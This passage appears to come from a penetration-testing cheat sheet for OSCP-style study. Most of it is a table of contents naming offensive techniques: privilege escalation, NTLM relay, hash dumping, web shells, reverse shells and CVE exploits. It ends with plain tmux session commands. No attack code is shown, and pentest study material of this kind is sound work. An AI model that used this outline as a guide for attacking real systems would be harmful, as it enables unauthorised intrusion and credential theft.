    - [Enable Remote Desktop (RDP)](#enable-remote-desktop-rdp)
    - [Privileges and Permissions](#privileges-and-permissions)
    - [AlwaysInstallElevated](#alwaysinstallelevated)
    - [SeBackup and SeRestore Privilege](#sebackup-and-serestore-privilege)
    - [Backup SAM and SYSTEM Hashes](#backup-sam-and-system-hashes)
    - [Dumping Hashes](#dumping-hashes)
    - [SeBackupPrivilege Privilege Escalation (diskshadow)](#sebackupprivilege-privilege-escalation-diskshadow)
    - [Script for PowerShell Environment](#script-for-powershell-environment)
    - [Copy ntds.dit](#copy-ntdsdit)
    - [Export System Registry Value](#export-system-registry-value)
    - [Extract the Hashes](#extract-the-hashes)
    - [Alternative Way via Robocopy](#alternative-way-via-robocopy)
    - [SeEnableDelegationPrivilege](#seenabledelegationprivilege)
    - [Example 1](#example-1)
    - [Example 2](#example-2)
    - [SeLoadDriverPrivilege](#seloaddriverprivilege)
    - [SeManageVolumePrivilege](#semanagevolumeprivilege)
    - [Grant full Permission on C:\ Drive](#grant-full-permission-on-c-drive)
    - [Overwriting "Printconfig.dll" for SYSTEM Shell Access](#overwriting-printconfigdll-for-system-shell-access)
    - [SeTakeOwnershipPrivilege](#setakeownershipprivilege)
    - [SeImpersonate and SeAssignPrimaryToken Privilege](#seimpersonate-and-seassignprimarytoken-privilege)
    - [DLL Hijacking](#dll-hijacking)
    - [Standard Search Order](#standard-search-order)
    - [DLL Abuse](#dll-abuse)
    - [customdll.cpp](#customdllcpp)
    - [Compiling customdll.cpp](#compiling-customdllcpp)
    - [Leveraging Windows Services](#leveraging-windows-services)
    - [Running Services Enumeration](#running-services-enumeration)
    - [Service Configuration Enumeration](#service-configuration-enumeration)
    - [Permission Table](#permission-table)
    - [Permission Enumeration](#permission-enumeration)
    - [Permissions Abuse](#permissions-abuse)
    - [adduser.c](#adduserc)
    - [Compiling](#compiling)
    - [PowerView Example](#powerview-example)
    - [Service Execution Properties Enumeration](#service-execution-properties-enumeration)
    - [Unquoted Service Paths](#unquoted-service-paths)
    - [Search Order](#search-order)
    - [Service Path Enumeration](#service-path-enumeration)
    - [Scheduled Tasks Enumeration](#scheduled-tasks-enumeration)
    - [writeDACL](#writedacl)
  - [NTLM](#ntlm)
    - [NTLM Hash Conversion](#ntlm-hash-conversion)
    - [Unauthenticated](#unauthenticated)
    - [LLMNR/mDNS/NBNS Poisoning](#llmnrmdnsnbns-poisoning)
    - [Capture](#capture)
    - [Relay](#relay)
    - [DHCPv6 Spoofing](#dhcpv6-spoofing)
    - [PetitPotam](#petitpotam)
    - [Authenticated](#authenticated)
    - [DFSCoerce](#dfscoerce)
    - [ShadowCoerce](#shadowcoerce)
    - [PrinterBug](#printerbug)
    - [MSEven (CheeseOunce)](#mseven-cheeseounce)
    - [WebDAV Coercion](#webdav-coercion)
    - [Check for WebClient Service](#check-for-webclient-service)
    - [Get a NetBIOS Name](#get-a-netbios-name)
    - [ADIDNS Poisoning](#adidns-poisoning)
    - [PetitPotam via WebDAV](#petitpotam-via-webdav)
    - [DFSCoerce via WebDAV](#dfscoerce-via-webdav)
  - [PKINITtools](#pkinittools)
    - [Fixing socket ssl wrapping error: [Errno 104] Connection reset by peer Error](#fixing-socket-ssl-wrapping-error-errno-104-connection-reset-by-peer-error)
  - [RunasCs](#runascs)
  - [RustHound-CE](#rusthound-ce)
  - [Shadow Credentials](#shadow-credentials)
  - [Titanis](#titanis)
    - [Installation](#installation)
    - [Upgrade .NET SDK to Version 8](#upgrade-net-sdk-to-version-8)
    - [Remove old .NET SDK](#remove-old-net-sdk)
    - [Install .NET 8 SDK system-wide to /usr/share/dotnet](#install-net-8-sdk-system-wide-to-usrsharedotnet)
    - [Symlink dotnet Binary so it's available on PATH](#symlink-dotnet-binary-so-its-available-on-path)
    - [Set DOTNET_ROOT globally for all Users](#set-dotnet_root-globally-for-all-users)
    - [Install Titanis](#install-titanis)
    - [Download, extract, and set up all Titanis Tools in /opt/titanis](#download-extract-and-set-up-all-titanis-tools-in-opttitanis)
    - [Make each Tool executable and symlink to /usr/bin for easy Access](#make-each-tool-executable-and-symlink-to-usrbin-for-easy-access)
    - [CredCoerce](#credcoerce)
    - [Kerb](#kerb)
    - [asreq](#asreq)
    - [getasinfo](#getasinfo)
    - [tgsreq](#tgsreq)
    - [renew](#renew)
    - [select](#select)
    - [changepw](#changepw)
    - [setpw](#setpw)
    - [s2k](#s2k)
    - [Smb2Client](#smb2client)
    - [ls](#ls)
    - [put](#put)
    - [rm / rmdir](#rm--rmdir)
    - [mkdir](#mkdir)
    - [mklink](#mklink)
    - [mount / umount](#mount--umount)
    - [touch](#touch)
    - [watch](#watch)
    - [enumshares](#enumshares)
    - [enumsessions](#enumsessions)
    - [enumopenfiles](#enumopenfiles)
    - [enumnics](#enumnics)
    - [enumsnapshots](#enumsnapshots)
    - [enumstreams](#enumstreams)
    - [query](#query)
    - [invoke](#invoke)
    - [exec](#exec)
    - [lsns](#lsns)
    - [lsclass](#lsclass)
    - [lsprop](#lsprop)
    - [lsmethod](#lsmethod)
    - [backup / restore](#backup--restore)
    - [delete](#delete)
  - [SMB Relay Attack](#smb-relay-attack)
  - [IPv6 Attack](#ipv6-attack)
  - [AD Recon (OSCP)](#ad-recon-oscp)
    - [PowerView](#powerview)
    - [Bloodhound](#bloodhound)
    - [Mimikatz Commands](#mimikatz-commands)
- [11. SQLMap](#11-sqlmap)
  - [Advanced SQLMap Options](#advanced-sqlmap-options)
- [12. Attacking Common Web Applications](#12-attacking-common-web-applications)
  - [Application Enumeration](#application-enumeration)
  - [WordPress](#wordpress)
    - [Malicious Wordpress Plugin](#malicious-wordpress-plugin)
  - [Joomla](#joomla)
  - [Drupal](#drupal)
  - [Tomcat](#tomcat)
  - [Splunk](#splunk)
  - [PRTG](#prtg)
  - [GitLab](#gitlab)
  - [CGI](#cgi)
  - [ColdFusion](#coldfusion)
  - [IIS Tilde Enumeration](#iis-tilde-enumeration)
  - [LDAP](#ldap-1)
  - [Jenkins](#jenkins)
  - [osTicket, Thick Clients, Mass Assignment & Hardening](#osticket-thick-clients-mass-assignment--hardening)
    - [osTicket](#osticket)
    - [Thick Client Applications](#thick-client-applications)
    - [Web Mass Assignment](#web-mass-assignment)
    - [Application Hardening](#application-hardening)
  - [Applications Connecting to Services](#applications-connecting-to-services)
  - [Set Proxy Environment Variables](#set-proxy-environment-variables)
  - [WebDAV (cadaver)](#webdav-cadaver)
  - [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
    - [XSS client-Side Attack](#xss-client-side-attack)
    - [Request Example](#request-example)
    - [Get nonce](#get-nonce)
    - [Update Payload Script](#update-payload-script)
    - [Compress Payload Script](#compress-payload-script)
    - [Encoding Function](#encoding-function)
    - [Encoded Payload](#encoded-payload)
    - [Execution](#execution-1)
  - [GitTools](#gittools)
  - [Local File Inclusion (LFI)](#local-file-inclusion-lfi)
    - [Until php 5.3](#until-php-53)
    - [Null Byte](#null-byte)
    - [Encoded Traversal Strings](#encoded-traversal-strings)
    - [php://filter Wrapper](#phpfilter-wrapper)
    - [Django, Rails, or Node.js Web Application Header Values](#django-rails-or-nodejs-web-application-header-values)
    - [Linux Files](#linux-files)
    - [Windows Files](#windows-files)
  - [PHP Upload Filter Bypasses](#php-upload-filter-bypasses)
  - [PHP Generic Gadget Chains (PHPGGC)](#php-generic-gadget-chains-phpggc)
  - [Server-Side Request Forgery (SSRF)](#server-side-request-forgery-ssrf)
  - [Server-Side Template Injection (SSTI)](#server-side-template-injection-ssti)
    - [Fuzz String](#fuzz-string)
    - [Magic Payload](#magic-payload)
  - [Upload Vulnerabilities](#upload-vulnerabilities)
  - [XML External Entity (XXE)](#xml-external-entity-xxe)
    - [Skeleton Payload Request](#skeleton-payload-request)
    - [Payloads](#payloads)
  - [Web Server Enumeration (80/tcp)](#web-server-enumeration-80tcp)
  - [Default & Weak Logins](#default--weak-logins)
- [13. Linux Privilege Escalation](#13-linux-privilege-escalation)
  - [Quick Checks](#quick-checks)
  - [Information Gathering](#information-gathering)
    - [Environment Enumeration](#environment-enumeration)
    - [Services & Internals Enumeration](#services--internals-enumeration)
    - [Credential Hunting](#credential-hunting)
    - [CentOS](#centos)
    - [Environment Variables](#environment-variables)
    - [gcc](#gcc)
    - [getfacl](#getfacl)
    - [iconv](#iconv)
    - [vi](#vi)
    - [Windows Command Formatting](#windows-command-formatting)
    - [Basic Linux Enumeration](#basic-linux-enumeration)
    - [Abusing Password Authentication](#abusing-password-authentication)
    - [Apache2](#apache2)
    - [Read first Line of a File with apache2 Binary](#read-first-line-of-a-file-with-apache2-binary)
    - [APT](#apt)
    - [arua2c](#arua2c)
    - [Bash Debugging Mode](#bash-debugging-mode)
    - [Bash Functions](#bash-functions)
    - [Credential Harvesting](#credential-harvesting-1)
    - [find Commands](#find-commands)
    - [iptables](#iptables)
    - [sudo Misconfiguration Abuse](#sudo-misconfiguration-abuse)
    - [LD_PRELOAD](#ld_preload)
    - [shell.c](#shellc)
    - [Compiling](#compiling-1)
    - [Privilege Escalation](#privilege-escalation-1)
    - [LD_LIBRARY_PATH](#ld_library_path)
    - [Get Information about Libraries](#get-information-about-libraries)
    - [logrotten](#logrotten)
    - [If "create"-option is set in logrotate.cfg](#if-create-option-is-set-in-logrotatecfg)
    - [If "compress"-option is set in logrotate.cfg](#if-compress-option-is-set-in-logrotatecfg)
    - [Path Variable Hijacking](#path-variable-hijacking)
    - [PHP7.2](#php72)
  - [Environment-Based Privilege Escalation](#environment-based-privilege-escalation)
    - [Path Abuse](#path-abuse)
    - [Wildcard Abuse](#wildcard-abuse)
    - [Escaping Restricted Shells](#escaping-restricted-shells)
  - [Permissions-Based Privilege Escalation](#permissions-based-privilege-escalation)
    - [Special Permissions (SUID/SGID)](#special-permissions-suidsgid)
    - [Sudo Rights Abuse](#sudo-rights-abuse)
    - [Privileged Groups](#privileged-groups)
    - [Capabilities](#capabilities)
  - [Service-Based Privilege Escalation](#service-based-privilege-escalation)
    - [Vulnerable Services](#vulnerable-services)
    - [Cron Job Abuse](#cron-job-abuse)
    - [LXD](#lxd)
    - [Docker](#docker)
    - [Kubernetes](#kubernetes)
    - [Logrotate](#logrotate)
    - [Miscellaneous Techniques](#miscellaneous-techniques)
  - [Linux Internals-Based Privilege Escalation](#linux-internals-based-privilege-escalation)
    - [Kernel Exploits](#kernel-exploits)
    - [Shared Libraries (LD_PRELOAD)](#shared-libraries-ld_preload)
    - [Shared Object Hijacking](#shared-object-hijacking)
    - [Python Library Hijacking](#python-library-hijacking)
  - [Recent 0-Days](#recent-0-days)
    - [Sudo — CVE-2021-3156 (Baron Samedit)](#sudo--cve-2021-3156-baron-samedit)
    - [Sudo Policy Bypass — CVE-2019-14287](#sudo-policy-bypass--cve-2019-14287)
    - [Polkit — CVE-2021-4034 (PwnKit)](#polkit--cve-2021-4034-pwnkit)
    - [Dirty Pipe — CVE-2022-0847](#dirty-pipe--cve-2022-0847)
    - [Netfilter](#netfilter)
  - [Hardening Considerations](#hardening-considerations)
  - [Skills Assessment](#skills-assessment)
  - [References](#references)
  - [Linux Privilege Escalation Checklist](#linux-privilege-escalation-checklist)
    - [Useful commands](#useful-commands)
    - [Basic info](#basic-info)
    - [Programs running as root](#programs-running-as-root)
    - [Installed software](#installed-software)
    - [Weak/reused/plaintext passwords](#weakreusedplaintext-passwords)
    - [Inside service](#inside-service)
    - [Suid misconfiguration](#suid-misconfiguration)
    - [Unmounted filesystems](#unmounted-filesystems)
    - [Cronjob](#cronjob)
    - [SSH Keys](#ssh-keys)
    - [Bad path configuration](#bad-path-configuration)
    - [Find plain passwords](#find-plain-passwords)
    - [Scripts](#scripts)
    - [BASH](#bash-1)
    - [SUID](#suid)
    - [MSFVENOM LIBRARY Priv Esc](#msfvenom-library-priv-esc)
    - [PS Monitor for cron](#ps-monitor-for-cron)
    - [Linux Privesc Tools](#linux-privesc-tools)
    - [Linux Precompiled Exploits](#linux-precompiled-exploits)
  - [Post-Exploitation Loot Checklist (Linux)](#post-exploitation-loot-checklist-linux)
    - [Proof](#proof)
    - [Local](#local)
    - [Network secret](#network-secret)
    - [Passwords and hashes](#passwords-and-hashes)
    - [Dualhomed](#dualhomed)
    - [Tcpdump](#tcpdump)
    - [Interesting files](#interesting-files)
    - [Databases](#databases)
    - [Browser](#browser)
    - [Mail](#mail)
    - [GUI](#gui)
- [14. Penetration Testing Process](#14-penetration-testing-process)
  - [Laws & Regulations](#laws--regulations)
  - [Engagement Stages](#engagement-stages)
    - [Pre-Engagement](#pre-engagement)
    - [Information Gathering](#information-gathering-1)
    - [Vulnerability Assessment](#vulnerability-assessment)
    - [Exploitation](#exploitation)
    - [Post-Exploitation](#post-exploitation)
    - [Lateral Movement](#lateral-movement-1)
    - [Proof-of-Concept](#proof-of-concept)
    - [Post-Engagement](#post-engagement)
  - [Practice](#practice)
- [15. Getting Started](#15-getting-started)
  - [Setup](#setup)
  - [Basic Workflow](#basic-workflow)
  - [Shells and Stabilization](#shells-and-stabilization)
  - [Privilege Escalation and File Transfer](#privilege-escalation-and-file-transfer)
  - [Nibbles Walkthrough](#nibbles-walkthrough)
  - [Common Pitfalls](#common-pitfalls)
- [16. Vulnerability Assessment](#16-vulnerability-assessment)
  - [Assessment Types](#assessment-types)
  - [Scoring and References](#scoring-and-references)
  - [Nessus](#nessus)
  - [OpenVAS / GVM](#openvas--gvm)
  - [Nessus Advanced Settings & Export](#nessus-advanced-settings--export)
  - [Reporting](#reporting)
  - [Vulnerability Analysis Resources](#vulnerability-analysis-resources)
  - [Exploit Databases](#exploit-databases)
  - [CVE References](#cve-references)
    - [Miscellaneous Exploits](#miscellaneous-exploits)
    - [Vegetable Exploits](#vegetable-exploits)
    - [Exploit Collections](#exploit-collections)
  - [Buffer Overflow](#buffer-overflow)
  - [Exploit Searching (SearchSploit)](#exploit-searching-searchsploit)
  - [CVE Exploits & PoCs](#cve-exploits--pocs)
    - [CVE-2014-6271: Shellshock RCE PoC](#cve-2014-6271-shellshock-rce-poc)
    - [CVE-2016-1531: exim LPE](#cve-2016-1531-exim-lpe)
    - [CVE-2019-14287: Sudo Bypass](#cve-2019-14287-sudo-bypass)
    - [CVE-2020-1472: ZeroLogon PE](#cve-2020-1472-zerologon-pe)
    - [CVE-2021-3156: Sudo / sudoedit LPE](#cve-2021-3156-sudo--sudoedit-lpe)
    - [CVE-2021-42287: NoPac LPE](#cve-2021-42287-nopac-lpe)
    - [CVE-2021-44228: Log4Shell RCE (0-day)](#cve-2021-44228-log4shell-rce-0-day)
    - [CVE-2022-0847: Dirty Pipe LPE](#cve-2022-0847-dirty-pipe-lpe)
    - [CVE-2022-22963: Spring4Shell RCE (0-day)](#cve-2022-22963-spring4shell-rce-0-day)
    - [CVE-2022-31214: Firejail LPE](#cve-2022-31214-firejail-lpe)
    - [CVE-2023-21746: Windows NTLM EoP LocalPotato LPE](#cve-2023-21746-windows-ntlm-eop-localpotato-lpe)
    - [CVE-2023-22809: Sudo Bypass](#cve-2023-22809-sudo-bypass)
    - [CVE-2023-32629, CVE-2023-2640: GameOverlay Ubuntu Kernel Exploit LPE (0-day)](#cve-2023-32629-cve-2023-2640-gameoverlay-ubuntu-kernel-exploit-lpe-0-day)
    - [CVE-2023-4911: Looney Tunables LPE](#cve-2023-4911-looney-tunables-lpe)
    - [CVE-2023-7028: GitLab Account Takeover](#cve-2023-7028-gitlab-account-takeover)
    - [CVE-2024-4577: PHP-CGI Argument Injection Vulnerability RCE](#cve-2024-4577-php-cgi-argument-injection-vulnerability-rce)
    - [CVE-2025-29927: Next.js Authentication Bypass](#cve-2025-29927-nextjs-authentication-bypass)
    - [CVE-2025-32463: chwoot sudo LPE](#cve-2025-32463-chwoot-sudo-lpe)
    - [CVE-2025-55182: React2Shell RCE](#cve-2025-55182-react2shell-rce)
    - [CVE-2026-24061: GNU Inetutils telnetd RCE](#cve-2026-24061-gnu-inetutils-telnetd-rce)
    - [CVE-2026-46300: Fragnesia Universal Linux LPE](#cve-2026-46300-fragnesia-universal-linux-lpe)
    - [BadSuccessor Delegated Managed Service Account (dMSA) LPE](#badsuccessor-delegated-managed-service-account-dmsa-lpe)
    - [GodPotato LPE](#godpotato-lpe)
    - [Juicy Potato LPE](#juicy-potato-lpe)
    - [JuicyPotatoNG LPE](#juicypotatong-lpe)
    - [MySQL 4.x/5.0 User-Defined Function (UDF) Dynamic Library (2) LPE](#mysql-4x50-user-defined-function-udf-dynamic-library-2-lpe)
    - [PrintSpoofer LPE](#printspoofer-lpe)
    - [SharpEfsPotato LPE](#sharpefspotato-lpe)
    - [Shocker Container Escape](#shocker-container-escape)
- [17. Using the Metasploit Framework](#17-using-the-metasploit-framework)
  - [MSFconsole Basics](#msfconsole-basics)
    - [Metasploit through Proxychains](#metasploit-through-proxychains)
    - [Auxiliary Output Directory](#auxiliary-output-directory)
    - [Meterpreter Listener](#meterpreter-listener)
    - [Generate Payload](#generate-payload)
    - [Setup Listener for Microsoft Windows](#setup-listener-for-microsoft-windows)
    - [Download Files](#download-files-1)
  - [Modules, Targets, and Payloads](#modules-targets-and-payloads)
  - [Encoders and Evasion](#encoders-and-evasion)
  - [Database and Workspaces](#database-and-workspaces)
  - [Sessions and Jobs](#sessions-and-jobs)
  - [Meterpreter](#meterpreter)
  - [Plugins & Mixins](#plugins--mixins)
  - [Writing and Importing Modules](#writing-and-importing-modules)
  - [MSFvenom and Handlers](#msfvenom-and-handlers)
  - [Wrapping and Packing](#wrapping-and-packing)
  - [References](#references-1)
- [18. Using Web Proxies](#18-using-web-proxies)
  - [Proxy Setup](#proxy-setup)
  - [Core Workflow](#core-workflow)
  - [Burp/ZAP Feature Map](#burpzap-feature-map)
  - [Proxying Command-Line Tools](#proxying-command-line-tools)
  - [Useful Burp/ZAP Features](#useful-burpzap-features)
- [19. Command Injections](#19-command-injections)
  - [Detection](#detection)
  - [Basic Exploitation](#basic-exploitation)
  - [Filter Evasion](#filter-evasion)
  - [Obfuscation Tools](#obfuscation-tools)
  - [Blind / Out-of-Band Checks](#blind--out-of-band-checks)
  - [Prevention](#prevention)
- [20. Attacking Web Applications with Ffuf](#20-attacking-web-applications-with-ffuf)
  - [Directory and Page Fuzzing](#directory-and-page-fuzzing)
    - [Common Commands](#common-commands-2)
    - [Using a Request File](#using-a-request-file)
    - [API Fuzzing](#api-fuzzing)
    - [Searching for LFI](#searching-for-lfi)
    - [Fuzzing with PHP Session ID](#fuzzing-with-php-session-id)
    - [Recursion](#recursion)
    - [File Extensions](#file-extensions)
    - [Rate Limiting](#rate-limiting)
    - [Virtual Host Discovery](#virtual-host-discovery)
    - [Massive File Extension Discovery](#massive-file-extension-discovery)
    - [Common File Extensions](#common-file-extensions)
    - [Common Picture Extensions](#common-picture-extensions)
    - [POST Requests](#post-requests)
    - [DNS Recon](#dns-recon)
    - [VHost Discovery](#vhost-discovery)
    - [Specifiy User Agent](#specifiy-user-agent)
  - [Domain and Vhost Fuzzing](#domain-and-vhost-fuzzing)
  - [Parameter and Value Fuzzing](#parameter-and-value-fuzzing)
  - [Result Filters](#result-filters)
  - [wfuzz](#wfuzz)
    - [Write to File](#write-to-file)
    - [Custom Scan with limited Output](#custom-scan-with-limited-output)
    - [Fuzzing two Parameters at once](#fuzzing-two-parameters-at-once)
    - [Domain](#domain)
    - [Subdomain](#subdomain)
    - [Git](#git)
    - [Login](#login)
    - [SQL](#sql)
    - [DNS](#dns-1)
    - [Numbering Files](#numbering-files)
    - [Enumerating PIDs](#enumerating-pids)
  - [URL Brute Forcing](#url-brute-forcing)
- [21. SQL Injection Fundamentals](#21-sql-injection-fundamentals)
  - [MySQL Basics](#mysql-basics)
  - [Authentication Bypass](#authentication-bypass-1)
  - [UNION Injection](#union-injection)
  - [Database Enumeration](#database-enumeration)
  - [Reading and Writing Files](#reading-and-writing-files)
  - [Mitigations](#mitigations)
  - [SQL Injection Checks](#sql-injection-checks)
  - [SQL Login Bypass](#sql-login-bypass)
  - [SQL Injection Reference](#sql-injection-reference)
    - [SQL Injection Commands](#sql-injection-commands)
    - [SQL Truncation Attack](#sql-truncation-attack)
- [22. Cross-Site Scripting (XSS)](#22-cross-site-scripting-xss)
  - [Types](#types)
  - [Test Payloads](#test-payloads)
  - [Discovery](#discovery)
  - [Defacing](#defacing)
  - [Phishing](#phishing)
  - [Session Hijacking](#session-hijacking)
  - [Prevention](#prevention-1)
  - [XSS Checks](#xss-checks)
- [23. File Inclusion](#23-file-inclusion)
  - [Local File Inclusion (LFI)](#local-file-inclusion-lfi-1)
  - [PHP Filters](#php-filters)
  - [PHP Wrappers](#php-wrappers)
  - [Remote File Inclusion (RFI)](#remote-file-inclusion-rfi)
  - [LFI + File Upload](#lfi--file-upload)
  - [Log Poisoning](#log-poisoning)
  - [Automation](#automation)
  - [Prevention](#prevention-2)
  - [PDF PHP Inclusion](#pdf-php-inclusion)
  - [LFI & RFI](#lfi--rfi)
- [24. File Upload Attacks](#24-file-upload-attacks)
  - [Web Shell Upload](#web-shell-upload)
  - [Client-Side Validation](#client-side-validation)
  - [Filter Bypasses](#filter-bypasses)
  - [Limited Uploads](#limited-uploads)
  - [Other Upload Attacks](#other-upload-attacks)
  - [Prevention](#prevention-3)
  - [Image Upload Filter Bypass](#image-upload-filter-bypass)
- [25. Web Attacks](#25-web-attacks)
  - [HTTP Verb Tampering](#http-verb-tampering)
  - [Insecure Direct Object References (IDOR)](#insecure-direct-object-references-idor)
  - [XML External Entity (XXE) Injection](#xml-external-entity-xxe-injection)
  - [Prevention](#prevention-4)
- [26. Windows Privilege Escalation](#26-windows-privilege-escalation)
  - [Tools](#tools)
  - [Situational Awareness and Enumeration](#situational-awareness-and-enumeration)
  - [User Privileges](#user-privileges)
    - [SeImpersonate / SeAssignPrimaryToken](#seimpersonate--seassignprimarytoken)
    - [SeDebugPrivilege](#sedebugprivilege)
    - [SeTakeOwnershipPrivilege](#setakeownershipprivilege-1)
  - [Group Privileges](#group-privileges)
    - [Backup Operators / SeBackupPrivilege](#backup-operators--sebackupprivilege)
    - [Event Log Readers](#event-log-readers)
    - [DnsAdmins](#dnsadmins)
    - [Hyper-V Administrators](#hyper-v-administrators)
    - [Print Operators](#print-operators)
    - [Server Operators](#server-operators)
  - [User Account Control (UAC)](#user-account-control-uac)
  - [Weak Permissions and Services](#weak-permissions-and-services)
  - [Kernel Exploits](#kernel-exploits-1)
  - [Vulnerable Services](#vulnerable-services-1)
  - [DLL Injection and Hijacking](#dll-injection-and-hijacking)
  - [Credential Theft](#credential-theft)
  - [Interacting with Users](#interacting-with-users)
  - [Pillaging](#pillaging)
  - [Restricted Environments and Additional Techniques](#restricted-environments-and-additional-techniques)
    - [Citrix Breakout](#citrix-breakout)
    - [Scheduled Tasks](#scheduled-tasks)
    - [End-of-Life Systems](#end-of-life-systems)
  - [Hardening](#hardening)
  - [PowerShell Commands](#powershell-commands)
    - [Common Commands](#common-commands-3)
    - [Allow Script Execution](#allow-script-execution)
    - [Script Execution Bypass](#script-execution-bypass)
    - [Import Module to PowerShell cmdlet](#import-module-to-powershell-cmdlet)
    - [Check PowerShell Versions](#check-powershell-versions)
    - [Read PowerShell History](#read-powershell-history)
    - [Base64 Encoding using pwsh](#base64-encoding-using-pwsh)
    - [Create a .zip File](#create-a-zip-file)
    - [Unzip a File](#unzip-a-file)
    - [Start a new Process](#start-a-new-process)
    - [Invoke-Expression / Invoke-WebRequest](#invoke-expression--invoke-webrequest)
    - [.NET Reflection](#net-reflection)
    - [Switching Sessions in PowerShell](#switching-sessions-in-powershell)
    - [Add new Domain Administrator](#add-new-domain-administrator)
    - [Execute Commands in User Context](#execute-commands-in-user-context)
    - [Execute Scripts with Credentials (Reverse Shell)](#execute-scripts-with-credentials-reverse-shell)
    - [Set User Password via Active Directory Service Interfaces (ADSI)](#set-user-password-via-active-directory-service-interfaces-adsi)
  - [PrivescCheck](#privesccheck)
  - [Seatbelt](#seatbelt)
  - [Windows Privilege Escalation Checklist](#windows-privilege-escalation-checklist)
    - [Basic info](#basic-info-1)
    - [Cleartext passwords](#cleartext-passwords)
    - [Reconfigure service parameters](#reconfigure-service-parameters)
    - [Dump process for passwords](#dump-process-for-passwords)
    - [Inside service](#inside-service-1)
    - [Programs running as Admin/system](#programs-running-as-adminsystem)
    - [Installed software](#installed-software-1)
    - [Weak passwords](#weak-passwords)
    - [Add user and enable RDP](#add-user-and-enable-rdp)
    - [Powershell sudo for Windows](#powershell-sudo-for-windows)
    - [Windows download with bitsadmin](#windows-download-with-bitsadmin)
    - [Windows download with certutil.exe](#windows-download-with-certutilexe)
    - [Windows download with powershell](#windows-download-with-powershell)
    - [PowerShell Priv Esc](#powershell-priv-esc)
    - [Windows Download from FTP](#windows-download-from-ftp)
    - [Windows NC File Transfer](#windows-nc-file-transfer)
    - [Windows create SMB Server transfer files](#windows-create-smb-server-transfer-files)
    - [Windows download with VBS](#windows-download-with-vbs)
    - [Windows XP SP1 PrivEsc](#windows-xp-sp1-privesc)
    - [Pass The Hash](#pass-the-hash)
    - [Scripts](#scripts-1)
    - [Useradd](#useradd)
    - [Powershell Run As](#powershell-run-as)
    - [Powershell Reverse Shell](#powershell-reverse-shell-1)
    - [Windows privesc/enum tools](#windows-privescenum-tools)
    - [Windows precompiled exploits](#windows-precompiled-exploits)
    - [Port Forwarding](#port-forwarding-1)
  - [Post-Exploitation Loot Checklist (Windows)](#post-exploitation-loot-checklist-windows)
    - [Proof](#proof-1)
    - [Passwords and hashes](#passwords-and-hashes-1)
    - [Dualhomed](#dualhomed-1)
    - [Tcpdump](#tcpdump-1)
    - [Interesting files](#interesting-files-1)
- [27. Documentation & Reporting](#27-documentation--reporting)
  - [Notetaking and Organization](#notetaking-and-organization)
  - [Report Types](#report-types)
  - [Components of a Finding](#components-of-a-finding)
  - [Writing Tips](#writing-tips)
  - [Report Quality Checklist](#report-quality-checklist)
  - [Reporting Resources](#reporting-resources)
  - [OSCP Exam Report Template](#oscp-exam-report-template)
    - [Introduction](#introduction)
    - [Objective](#objective)
    - [Requirements](#requirements)
    - [High-Level Summary](#high-level-summary)
    - [Recommendations](#recommendations)
    - [Methodologies](#methodologies)
    - [Information Gathering](#information-gathering-2)
    - [Penetration](#penetration)
    - [System IP: 192.168.x.x](#system-ip-192168xx)
    - [Service Enumeration](#service-enumeration)
    - [Privilege Escalation](#privilege-escalation-2)
    - [Maintaining Access](#maintaining-access)
    - [House Cleaning](#house-cleaning)
    - [Additional Items](#additional-items)
    - [Appendix - Proof and Local Contents](#appendix---proof-and-local-contents)
    - [Appendix - Metasploit/Meterpreter Usage](#appendix---metasploitmeterpreter-usage)
    - [Appendix - Completed Buffer Overflow Code](#appendix---completed-buffer-overflow-code)
- [28. Attacking Enterprise Networks](#28-attacking-enterprise-networks)
  - [Engagement Flow](#engagement-flow)
  - [External Information Gathering](#external-information-gathering)
  - [Service and Web Enumeration](#service-and-web-enumeration)
  - [Initial Access](#initial-access)
  - [Internal Information Gathering](#internal-information-gathering)
  - [Internal Exploitation & Privilege Escalation](#internal-exploitation--privilege-escalation)
  - [Lateral Movement and AD Compromise](#lateral-movement-and-ad-compromise)
  - [Persistence & Post-Exploitation](#persistence--post-exploitation)
  - [Post-Exploitation and Closeout](#post-exploitation-and-closeout)
  - [Engagement Checklist](#engagement-checklist)
- [29. Useful Resources](#29-useful-resources)
  - [Kerberos](#kerberos-1)
    - [Ticket Handling](#ticket-handling)
    - [Kerberos related Files](#kerberos-related-files)
    - [Ticket Conversion](#ticket-conversion)
    - [kribi to ccache](#kribi-to-ccache)
    - [ccache to kirbi](#ccache-to-kirbi)
  - [Ligolo-ng](#ligolo-ng-1)
    - [Download Proxy and Agent](#download-proxy-and-agent-1)
    - [Prepare Tunnel Interface](#prepare-tunnel-interface-1)
    - [Setup Proxy on Attacker Machine](#setup-proxy-on-attacker-machine)
    - [Setup Agent on Target Machine](#setup-agent-on-target-machine)
    - [Configure Session](#configure-session-1)
    - [Port Forwarding](#port-forwarding-2)
    - [Alternative Session Configuration](#alternative-session-configuration)
    - [Add Route to Tunnel Interface](#add-route-to-tunnel-interface)
  - [Microsoft Windows](#microsoft-windows-1)
    - [dir](#dir)
  - [Time and Date](#time-and-date)
    - [Get the Server Time](#get-the-server-time)
    - [Stop virtualbox-guest-utils to stop syncing Time](#stop-virtualbox-guest-utils-to-stop-syncing-time)
    - [Stop systemd-timesyncd to sync Time manually](#stop-systemd-timesyncd-to-sync-time-manually)
    - [Disable automatic Sync](#disable-automatic-sync)
    - [Options to set the Date and Time](#options-to-set-the-date-and-time)
    - [net time](#net-time)
    - [ntpdate](#ntpdate)
    - [rdate](#rdate)
    - [faketime](#faketime)
    - [timedatectl](#timedatectl)
    - [Keep in Sync with a Server](#keep-in-sync-with-a-server)
  - [Upgrading Shells](#upgrading-shells)
    - [Oneliner](#oneliner)
    - [Error Handling](#error-handling-2)
    - [Fixing Staircase Effect](#fixing-staircase-effect)
  - [uv](#uv)
  - [VirtualBox](#virtualbox)
  - [virtualenv](#virtualenv)
  - [OSCP Learning Resources](#oscp-learning-resources)
  - [Information Gathering Resources](#information-gathering-resources)
  - [Web Application Analysis Resources](#web-application-analysis-resources)
  - [Database Assessment Resources](#database-assessment-resources)
  - [Password Attack Resources](#password-attack-resources)
  - [Exploitation Tool Resources](#exploitation-tool-resources)
  - [Post-Exploitation Resources](#post-exploitation-resources)
  - [Social Media Resources](#social-media-resources)
  - [Enumeration AIO](#enumeration-aio)

</details>

## 1. Tmux

```
# Start a new tmux session
tmux new -s <name>

# Start a new session or attach to an existing session named mysession
tmux new-session -A -s <name>

# List all sessions
tmux ls

# kill/delete session
tmux kill-session -t <name>

# kill all sessions but current
tmux kill-session -a

# attach to last session
tmux a
tmux a -t <name>

